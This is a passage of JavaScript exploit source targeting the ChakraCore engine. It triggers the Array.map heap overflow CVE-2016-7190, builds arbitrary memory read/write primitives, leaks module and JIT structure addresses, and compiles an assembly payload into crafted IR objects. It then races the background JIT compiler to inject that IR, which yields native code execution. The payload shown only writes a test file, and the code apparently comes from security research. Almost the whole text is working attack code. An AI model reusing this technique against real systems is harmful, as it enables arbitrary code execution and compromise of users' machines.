            if(op_type == null) {
               this.parser_status_ = "Line " + i + ": invalid operand: " + insl;
               return false;
            }

            if(ins == "push") {
               this.ins_arr_.push(new _instr_op1(ins, op_type, op));
            }

            else if(ins == "pop") {
               if(op_type == "TYPE_REG") {
                  this.ins_arr_.push(new _instr_op1(ins, op_type, op));
               }
               else {
                  this.parser_status_ = "Line " + i + ": invalid operand: " + insl;
                  return false;
               }
            }

            else if(ins == "call") {
               if(op_type == "TYPE_IMM") {
                  var op2 = this.imm_to_u64(op);
                  this.ins_arr_.push(new _instr_op2("mov",  "TYPE_REG", "r15", "TYPE_IMM", op2));
                  this.ins_arr_.push(new _instr_op1("call", "TYPE_REG", "r15"));
               }
               else if(op_type == "TYPE_IND_MEM_ADDR") {
                  var op2 = this.imm_to_u64(op.replace(/[^a-z0-9]/g, ""));
                  this.ins_arr_.push(new _instr_op2("mov",  "TYPE_REG", "r15", "TYPE_IMM", op2));
                  this.ins_arr_.push(new _instr_op2("mov",  "TYPE_REG", "r15", "TYPE_IND_REG", "[r15]"));
                  this.ins_arr_.push(new _instr_op1("call", "TYPE_REG", "r15"));
               }
               else if(op_type == "TYPE_REG") {
                  this.ins_arr_.push(new _ins_op1(ins, op_type, op));
               }
               else {
                  this.parser_status_ = "Line " + i + ": invalid operand: " + insl;
                  return false;
               }
            }

            else if(ins == "jmp") {
               this.ins_arr_.push(new _instr_op1(ins, op_type, op));
            }

            else if(ins == "je") {
               this.ins_arr_.push(new _instr_branch(ins, op_type, op));
            }

            else if(ins == "jne") {
               this.ins_arr_.push(new _instr_branch(ins, op_type, op));
            }
         }

         // mov add sub xor
         else if(operands.length == 2) {
            var op1      = operands[0];
            var op1_type = this.get_op_type(op1);
            var op2      = operands[1];
            var op2_type = this.get_op_type(op2);

            if(op1_type == null ||
               op2_type == null ||
               op1_type == "TYPE_IMM") {
               this.parser_status_ = "Line " + i + ": invalid operand: " + insl;
               return false;
            }

            if(op1_type == "TYPE_IND_MEM_ADDR") {
               var op1 = this.imm_to_u64(op1.replace(/[^a-z0-9]/g, ""));
               this.ins_arr_.push(new _instr_op2("mov",  "TYPE_REG", "r15", "TYPE_IMM", op1));
               op1 = "[r15]";
               op1_type = "TYPE_IND_REG";
            }

            if(op2_type == "TYPE_IND_MEM_ADDR") {
               var op2 = this.imm_to_u64(op2.replace(/[^a-z0-9]/g, ""));
               this.ins_arr_.push(new _instr_op2("mov",  "TYPE_REG", "r15", "TYPE_IMM", op2));
               op2 = "[r15]";
               op2_type = "TYPE_IND_REG";
            }

            if(op2_type == "TYPE_IMM") {
               op2 = this.imm_to_u64(op2);
            }

            if(ins == "mov") {               
               this.ins_arr_.push(new _instr_op2(ins, op1_type, op1, op2_type, op2));
            }
            
            else if(ins == "add") {
               this.ins_arr_.push(new _instr_op2(ins, op1_type, op1, op2_type, op2));
            }
            
            else if(ins == "sub") {              
               this.ins_arr_.push(new _instr_op2(ins, op1_type, op1, op2_type, op2));
            }
            
            else if(ins == "xor") {
               this.ins_arr_.push(new _instr_op2(ins, op1_type, op1, op2_type, op2));
            }
            
            else if(ins == "and") {
               this.ins_arr_.push(new _instr_op2(ins, op1_type, op1, op2_type, op2));
            }
            
            else if(ins == "or") {
               this.ins_arr_.push(new _instr_op2(ins, op1_type, op1, op2_type, op2));
            }
            
            else if(ins == "cmp") {
               this.ins_arr_.push(new _instr_op2(ins, op1_type, op1, op2_type, op2));
            }
            else {
               this.parser_status_ = "Line " + i + ": invalid instruction: " + insl;
               return false;
            }
         }
      }
      return true;
   }


   get_instr_addrs() {
      return this.ins_obj_arr_;
   }

   // ****  Step 3.2  **** 
   generate(u64_val_buf) {
      var u64_val_buf_curr = u64(u64_val_buf.hi_, u64_val_buf.lo_);
      
      // generate instr objects
      for(var i = 0; i < this.ins_arr_.length; ++i) {
         this.ins_obj_arr_.push(u64_val_buf_curr);

         u64_val_buf_curr = this.ins_arr_[i].to_mem(this.w8_, this.w64_, u64_val_buf_curr, this.u64_val_m_func_);
      }

      // search for labels
      var labels = {};
      for(var i = 0; i < this.ins_arr_.length; ++i) {
         if(this.ins_arr_[i].constructor.name == "_instr_label") {
            labels[this.ins_arr_[i].get_label_name()] = this.ins_arr_[i].get_addr();
         }
      }

      // patch every branch instr with label address
      for(var i = 0; i < this.ins_arr_.length; ++i) {
         
         if(this.ins_arr_[i].constructor.name == "_instr_branch") {
            var instr_branch = this.ins_arr_[i];
   
            if(labels.hasOwnProperty(instr_branch.get_label_name())) {
               var u64_addr_instr         = instr_branch.get_addr();
               var u64_addr_instr_label   = labels[instr_branch.get_label_name()];
               

               this.w64_(u64_addr_instr.addi(0,0x58), u64_addr_instr_label);
            }
         }
      }

      // create linked list
   }
}



function main() {
   // ****  Step 1  **** 
   CollectGarbage();
   var n = [];
   for (var i = 0; i < 0x10; i++) {
      // nice pattern for easy checking with debugger
      n.push([i*0x10000 |    1, i*0x10000 |    2, i*0x10000 |    3, i*0x10000 |    4,
              i*0x10000 |    5, i*0x10000 |    6, i*0x10000 |    7, i*0x10000 |    8,
              i*0x10000 |    9, i*0x10000 | 0x10, i*0x10000 | 0x11, i*0x10000 | 0x12,
              i*0x10000 | 0x13, i*0x10000 | 0x14, i*0x10000 | 0x15, i*0x10000 | 0x16, 
              i*0x10000 | 0x17, i*0x10000 | 0x18, i*0x10000 | 0x19, i*0x10000 | 0x20,
              i*0x10000 | 0x21, i*0x10000 | 0x22, i*0x10000 | 0x23]);
   }
   
   // we will disclose the address of the 0x8000 Uint8Array later to use it as 
   // buffer to write variables and the crafted intermediate representation.
   var c = [new Uint8Array(0x10000), new Uint8Array(0x20), new Uint8Array(0x20),
            new Uint8Array(0x20),   new Uint8Array(0x20), new Uint8Array(0x20)];
   n.push(c);
   
   class fake extends Object {
      static get [Symbol.species]() { return function() { return n[5]; }; };
   }
   
   var ii = 2
   var handler = {
      get: function(target, name){
         if(name == "length"){
            return 0x20;
         }
         if(name == "constructor")
            return fake;

         if(name == 0) { // leak base addr of NativeIntArray n[6] 
            return  n[6];
         }
         if(name == 1) { // leak base addr Uint8Array 0x8000
            return n[0x10][0];
         }
         
         if(name == 17) { // overwrite n[6] JavascriptArray.length
            return 0x7FFFFFFF;
         }
         
         if(name == 21) { // overwrite len of n[6] SparseArraySegment.length
            return 0x7f00000000;
         }
         
         if(name == 22) { // overwrite length  of n[6] SparseArraySegment.size
            return 0x7FFFFFFF;
         }
         
         return 0; // never executed
      },

      // by only returning for some elements true we avoid linear buffer overflow 
      // -> overwrite only specifc values
      has: function(target, name){
          //print("has " + name);
         if(name == 0 || name == 1 || name == 17 || name == 21|| name == 22) {
            return true;
         }
         return false;
      }
   };
   
   var y = new Proxy([], handler);
      
   
   // ----------------------------------------------------------------------------
   // Exploit heap overflow to gain arbitrary read/write
   // 
   //  - Used vulnerability in Array.map (CVE-2016-7190)
   //  - More info and PoC:
   //    - https://technet.microsoft.com/library/security/ms16-119
   //    - https://bugs.chromium.org/p/project-zero/issues/detail?id=923
   // ----------------------------------------------------------------------------
   
   // trigger overflow
   var o = Array.prototype.map.apply(y, [function(a){ return a; }]);
   print(hex(n[6].length));
   
   w32_rel = function(offset, val) {
      n[6][(offset - 0x18)/4] = val;
   }
   
   r32_rel = function(offset) {
      return n[6][(offset - 0x18)/4];
   }
   
   // by overwriting 
   //  - JavascriptArray.length
   //  - SparseArraySegment.length
   //  - SparseArraySegment.size
   // we can use the native JS array for oob access

   
   // DEBUG
   //print(hex(n[5][1]) + " " + hex(n[5][0]));
   //print(hex(n[5][3]) + " " + hex(n[5][2]));
   var uint8_base_addr   = u64(n[5][3], n[5][2]);
   var uint8_base_offset = n[5][2]- (n[5][0] + 0x40); 
   // print("Uint8Array base>> : " + hex(uint8_base_addr.hex()));
   // print("Uint8Array offset>> : " + hex(uint8_base_offset));
   
   //print("Uint8Array length>> " + hex(r32_rel(uint8_base_offset +0x20)));
   w32_rel(uint8_base_offset +0x20, 0x4141);
   //print("n[0x10][0].length " + n[0x10][0].length);
   //print("Uint8Array length>> " + hex(r32_rel(uint8_base_offset +0x20)));

   // get non clamped vtable
   var vtable_low_addr = r32_rel(uint8_base_offset +0x40);
   w32_rel(uint8_base_offset, vtable_low_addr);
   
   
   //print("Uint8Array length2>> " + hex(r32_rel(uint8_base_offset +0x28)));
   //print("Uint8Array length3>> " + hex(r32_rel(uint8_base_offset +0x2C)));
   
   var uint8_buf_addr = u64(r32_rel(uint8_base_offset + 0x3C), r32_rel(uint8_base_offset + 0x38))

   // print(uint8_buf_addr.hex());
   
   // ----------------------------------------------------------------------------
   // ----------------------------------------------------------------------------
   
   
   // ----------------------------------------------------------------------------
   // Define functions that read/write various data widths from/to memory 
   // 
   // ----------------------------------------------------------------------------
   
   // define functions to read and write arbitrary memory
   var set_buffer_addr = function(u64_addr) {
      w32_rel(uint8_base_offset +0x38, u64_addr.lo_);
      w32_rel(uint8_base_offset +0x3C, u64_addr.hi_);
   }
   
   var r8 = function(u64_addr) {
      set_buffer_addr(u64_addr);
      return n[0x10][0][0];
   };
   
   var r16 = function(u64_addr) {
      set_buffer_addr(u64_addr);
      return n[0x10][0][1] << 8 | n[0x10][0][0];
   };
   
   var r32 = function(u64_addr) {
      set_buffer_addr(u64_addr);
      return n[0x10][0][0] << 24 | n[0x10][0][1] << 16 |
             n[0x10][0][2] <<  8 | n[0x10][0][4];
   };
   
   var r64 = function(u64_addr) {
      set_buffer_addr(u64_addr);
      return u64(n[0x10][0][7] << 24 | n[0x10][0][6] << 16 |
                 n[0x10][0][5] <<  8 | n[0x10][0][4] << 32,
                 n[0x10][0][3] << 24 | n[0x10][0][2] << 16 |
                 n[0x10][0][1] <<  8 | n[0x10][0][0]);
   };
   
   var w8 = function(u64_addr, u8_val) {
      set_buffer_addr(u64_addr);
      n[0x10][0][0] = u8_val & 0xFF;
   }
   
   var w64 = function(u64_addr, u64_val) {
      set_buffer_addr(u64_addr);
      n[0x10][0][0] = (u64_val.lo_ >>  0) & 0xFF;
      n[0x10][0][1] = (u64_val.lo_ >>  8) & 0xFF;
      n[0x10][0][2] = (u64_val.lo_ >> 16) & 0xFF;
      n[0x10][0][3] = (u64_val.lo_ >> 24) & 0xFF;
      n[0x10][0][4] = (u64_val.hi_ >>  0) & 0xFF;
      n[0x10][0][5] = (u64_val.hi_ >>  8) & 0xFF;
      n[0x10][0][6] = (u64_val.hi_ >> 16) & 0xFF;
      n[0x10][0][7] = (u64_val.hi_ >> 24) & 0xFF;
   }
   
   // ----------------------------------------------------------------------------
   // ----------------------------------------------------------------------------
   
   
   // ****  Step 2  **** 
   // ----------------------------------------------------------------------------
   // Disclose memory addresses of the compiler and for the payload
   // 
   //  - Base address of ChakraCore to
   //    - access global variables
   //    - access import functions
   //
   //  - Global variables to disclose the address of the internal JIT
   //    structures
   //  - Imported functions to infer function addresses which are used for
   //    the attack payload
   // ----------------------------------------------------------------------------
   
   var chakra_base_addr = r64(uint8_base_addr).subi(0,0x5FEBB8);
   print("[+] ChakraCore base addr: " + chakra_base_addr.hex());
   

   // In the following we use fixed offsets between functions these might
   // need to be adjusted for other system! 

   var LoadLibraryEx = r64(chakra_base_addr.addi(0,0x573478));
   var GetProcAddr   = r64(chakra_base_addr.addi(0,0x573310));
   
   var exit_thread = r64(chakra_base_addr.addi(0, 0x573320));
   
   var thread_context = r64(chakra_base_addr.addi(0,0x6F2FC8)); // ChakraCore!ThreadContext
   print("[+] ChakraCore!ThreadContext::globalListFirst: " + thread_context.hex());
   
   var job_proc = r64(thread_context.addi(0, 0x948)); // ChakraCore!JsUtil::BackgroundJobProcessor
   print("[+] ChakraCore!ThreadContext::globalListFirst->jobProcessor: " + job_proc.hex());
   
   var  parallel_thread_data = r64(job_proc.addi(0, 0x90)); // ChakraCore!JsUtil::ParallelThreadData*
   print("[+] ChakraCore!ThreadContext::globalListFirst->jobProcessor->parallelThreadData: " + parallel_thread_data.hex());
   
   var  thread_arena = r64(r64(parallel_thread_data).addi(0, 0x110)); // ChakraCore!Memory::ArenaAllocator == stack address
   print("[+] ChakraCore!ThreadContext::globalListFirst->jobProcessor->*parallelThreadData->threadArena: " + thread_arena.hex());
   
   // there is a fixed offset between ChakraCore!Memory::ArenaAllocator and ChakraCore!Func of 0x650
   var func = thread_arena.subi(0,0x650); // ChakraCore!Func will contain IR::Instr ptrs
   print("[+] ChakraCore!Func: " + func.hex());
   
   var head_instr = r64(func.addi(0,0x0c8));
   print("[+] ChakraCore!Func->m_headInstr: " + head_instr.hex());
   
   // ----------------------------------------------------------------------------
   // ----------------------------------------------------------------------------
   
   
   // ----------------------------------------------------------------------------
   // Allocate memory for variables that are needed for the payload
   // 
   //  - create a new u64 variable that contains the address of 
   //    curr_uint8_buf_addr (addr of a Uint8Array)
   //  - add size of allocated varibale to curr_uint8_buf_addr
   // ----------------------------------------------------------------------------
   
   var curr_uint8_buf_addr = u64(uint8_buf_addr.hi_, uint8_buf_addr.lo_);

   var alloc = function(sz) {
      var a = u64(curr_uint8_buf_addr.hi_, curr_uint8_buf_addr.lo_);
      curr_uint8_buf_addr = curr_uint8_buf_addr.addi(0,sz + 1);
      return a;
   }


   var alloc_str = function(s) {
      var mem_str = alloc(s.length);
      for(var i = 0; i < s.length; ++i) {
          w8(mem_str.addi(0,i), s.charCodeAt(i));
       }
       return mem_str;
   }   

   var addr_buf_kernel32dll = alloc_str("kernel32.dll");
   var addr_handle_kernel32 = alloc(8);

   var addr_buf_CreateFileA = alloc_str("CreateFileA");
   var addr_ptr_CreateFileA = alloc(8);

   var addr_buf_WriteFile   = alloc_str("WriteFile");
   var addr_ptr_WriteFile   = alloc(8);

   var addr_buf_CloseHandle = alloc_str("CloseHandle");
   var addr_ptr_CloseHandle = alloc(8);

   var addr_buf_GetTempPath = alloc_str("GetTempPathA");
   var addr_ptr_GetTempPath = alloc(8);

   var addr_buf_ExitThread  = alloc_str("ExitThread");
   var addr_ptr_ExitThread  = alloc(8);

   var file_name            = "hello-from-data-only-attack.txt";
   var addr_buf_file_name   = alloc_str(file_name);
   var file_content         = "h3llo w0rld\n"
   var addr_buf_file_content= alloc_str(file_content);

   var addr_buf_1024        = alloc(1024);
   var addr_handle_file     = alloc(8);
   var addr_buf_nbw         = alloc(8);



   
   // ----------------------------------------------------------------------------
   // ----------------------------------------------------------------------------
   
   
   // ****  Step 5  **** 
   // ----------------------------------------------------------------------------
   // Payload that should be generated
   // 
   // ----------------------------------------------------------------------------
   var payload = `;
   int3  
   push rbp 
   mov rbp, rsp   
   sub rsp, 0x500
   ;  
   ; Resolve function addresses  
   ;  
   ; LoadLibraryEx(kernel32.dll, 0,0)  
   ;  
   xor r8, r8  
   xor rdx, rdx   
   mov rcx, #addr_buf_kernel32dll   
   call #addr_LoadLibraryExA  
   mov [#addr_handle_kernel32], rax 
   ;  
   ;  
   ; GetProcAddr(hKernel, CreateFile)  
   ;  
   mov rcx, rax   
   mov rdx, #addr_buf_CreateFileA   
   call #addr_GetProcAddr  
   mov [#addr_ptr_CreateFileA], rax 
   mov rcx, rax   
   ;  
   ;  
   ; GetProcAddr(hKernel, WriteFile)   
   ;  
   mov rcx, [#addr_handle_kernel32] 
   mov rdx, #addr_buf_WriteFile  
   call #addr_GetProcAddr  
   mov [#addr_ptr_WriteFile], rax   
   ;  
   ;  
   ; GetProcAddr(hKernel, GetTempPath)   
   ;  
   mov rcx, [#addr_handle_kernel32] 
   mov rdx, #addr_buf_GetTempPath   
   call #addr_GetProcAddr  
   mov [#addr_ptr_GetTempPath], rax 
   ;  
   ;  
   ; GetProcAddr(hKernel, CLoseHandle)   
   ;  
   mov rcx, [#addr_handle_kernel32] 
   mov rdx, #addr_buf_CloseHandle
   call #addr_GetProcAddr  
   mov [#addr_ptr_CloseHandle], rax 
   ;  
   ;  
   ; GetProcAddr(hKernel, ExitThread)   
   ;  
   mov rcx, [#addr_handle_kernel32] 
   mov rdx, #addr_buf_ExitThread
   call #addr_GetProcAddr  
   mov [#addr_ptr_ExitThread], rax 
   ;  
   ;  
   ; GetTempPath()   
   ;  
   mov rcx, 0x400 
   mov rdx, #addr_buf_1024
   call [#addr_ptr_GetTempPath]
   ;  
   ;   
   ; strcat(tmppath, filename)
   ;
   mov rsi, #addr_buf_file_name 
   mov rdi, #addr_buf_1024  
   add rdi, rax
   xor rcx, rcx
   L_strcat:
      xor rax, rax
      mov al, [rsi]
      mov [rdi], rax
      add rcx, 0x1
      add rsi, 0x1
      add rdi, 0x1
      cmp rcx, #len_file_name
      jne L_strcat
   ;  
   ;
   ; CreateFile()
   ; 
   mov rax, rsp
   add rax, 0x20
   mov [rax], 0x2
   add rax, 0x8
   mov [rax], 0x80
   add rax, 0x8
   mov [rax], 0x0
   xor r9, r9
   xor r8, r8
   mov rdx, 0x40000000
   mov rcx, #addr_buf_1024
   call [#addr_ptr_CreateFileA]
   mov [#addr_handle_file], rax
   ;  
   ;
   ; WriteFile()
   ; 
   mov rax, rsp
   add rax, 0x20
   mov [rax], 0x0
   mov r9, #addr_buf_nbw
   mov r8, #len_file_content
   mov rdx, #addr_buf_file_content
   mov rcx, [#addr_handle_file]
   call [#addr_ptr_WriteFile]
   ;  
   ;
   ; CloseHandle()
   ; 
   mov rcx, [#addr_handle_file]
   call [#addr_ptr_CloseHandle]
   xor rcx, rcx
   call [#addr_ptr_ExitThread]
   ;`;


   var args = {
      "#addr_LoadLibraryExA"     : LoadLibraryEx.hex(),
      "#addr_GetProcAddr"        : GetProcAddr.hex(),
      "#addr_buf_kernel32dll"    : addr_buf_kernel32dll.hex(),
      "#addr_handle_kernel32"    : addr_handle_kernel32.hex(),
      "#addr_buf_CreateFileA"    : addr_buf_CreateFileA.hex(),
      "#addr_ptr_CreateFileA"    : addr_ptr_CreateFileA.hex(),
      "#addr_buf_WriteFile"      : addr_buf_WriteFile.hex(),
      "#addr_ptr_WriteFile"      : addr_ptr_WriteFile.hex(),
      "#addr_buf_CloseHandle"    : addr_buf_CloseHandle.hex(),
      "#addr_ptr_CloseHandle"    : addr_ptr_CloseHandle.hex(),
      "#addr_buf_GetTempPath"    : addr_buf_GetTempPath.hex(),
      "#addr_ptr_GetTempPath"    : addr_ptr_GetTempPath.hex(),
      "#addr_buf_ExitThread"     : addr_buf_ExitThread.hex(),
      "#addr_ptr_ExitThread"     : addr_ptr_ExitThread.hex(),
      "#addr_buf_1024"           : addr_buf_1024.hex(),
      "#addr_buf_file_name"      : addr_buf_file_name.hex(),
      "#len_file_name"           : u64(0,file_name.length + 1).hex(),
      "#addr_handle_file"        : addr_handle_file.hex(),
      "#addr_buf_nbw"            : addr_buf_nbw.hex(),
      "#len_file_content"        : u64(0,file_content.length).hex(),
      "#addr_buf_file_content"   : addr_buf_file_content.hex(),
   }

   
   // ----------------------------------------------------------------------------
   // ----------------------------------------------------------------------------
   
   
   // ****  Step 3  **** 
   // ----------------------------------------------------------------------------
   // Instantiate new compiler which first parses the payload, and then 
   // generates the C++ memory objects
   // 
   // ----------------------------------------------------------------------------
   print("[+] start compiling");
   var c = new _compiler(w8, w64, payload, func, args);
   
   if(!c.parse()) {
      print(c.get_parser_status());
      return -1;
   }
   
   print("[+] generating mem objects");   
   
   c.generate(curr_uint8_buf_addr);
   
   print(curr_uint8_buf_addr.sub(uint8_buf_addr).hex());

   // get list of generated IR::Instr object addresses
   var it = c.get_instr_addrs();
   
   // connect generated mem objects in a linked list
   for(var i = 0; i < it.length - 1; ++i) {
      w64(it[i].addi(0,0x8), it[i+1]); // it[i]->m_next = it[i+1]
      w64(it[i+1].addi(0,0x10), it[i]); // it[i+1]->m_prev = it[i]
   }
   
   var first_inj_instr = it[0];
   var first_inj_instr_m_prev = first_inj_instr.addi(0, 0x10);
   var  last_inj_instr = it[it.length-1];
   var  last_inj_instr_m_next =  last_inj_instr.addi(0, 0x08);
   
   // ----------------------------------------------------------------------------
   // ----------------------------------------------------------------------------
   
   
   // ----------------------------------------------------------------------------
   // Win race condition
   //
   //  - The JIT compiler runs in a background thread and is triggered after a
   //    JavaScript function is executed a number of times in a row. By calling
   //    trigger_try_codegen in a loop we trigger the native code generation
   //    and can inject our crafted IR.
   //  - One challenge of this race condition is to inject the crafted IR in
   //    the right phase of the JIT compilation process. Specifically, we want
   //    to inject the crafted IR directly before EncoderMD::Encode() is
   //    executed. This is achieved by observing certain values of m_func which
   //    are changed by certain function calls.
   // ----------------------------------------------------------------------------
   
   var head_instr_addr = func.addi(0,0x0c8);
   var exit_instr_addr = func.addi(0,0x0d0);
   var tail_instr_addr = func.addi(0,0x0d8);
   var spill_size_addr = func.addi(0,0x0e0);
   
   var trigger_try_codegen = function(i) {
      var head_instr = r64(head_instr_addr);
      var tail_instr = r64(tail_instr_addr);
      var exit_instr = r64(exit_instr_addr);
   
      // The main challenge we face is to insert the crafted IR at the
      // right  moment. Our goal is to insert it directly before
      // EncoderMD::Encode (Backend\Func.cpp) is called. We achieve this
      // based on two observations
      
      if(i < 300) 
         return 0;
      
      // layout.Layout();
      // will change m_func so that exit_instr and tail_instr have
      // different addresses
      if(exit_instr.equals(tail_instr)) {
          return 0;
      }
      
      
      // lowerer.LowerPrologEpilog();
      // will set m_spill_size from -1 to some other value
      if(r8(spill_size_addr) == 0xFF) { 
         return 0;
      }
      
      // inject attacker IR into the existing IR::Instr double linked list
      w64(first_inj_instr_m_prev, head_instr);
      w64(last_inj_instr_m_next, tail_instr);
      
      w64(head_instr.addi(0, 0x08), first_inj_instr);
      w64(tail_instr.addi(0, 0x10),  last_inj_instr);
   
      return 1;
   }
   
   
   // for winning the race we repeat it a few times
   print("[+] starting the race");  
   for (var i = 0; i < 1000; i++) {
      trigger_try_codegen(i);
   }
   print("[-] please restart");  
}

return main();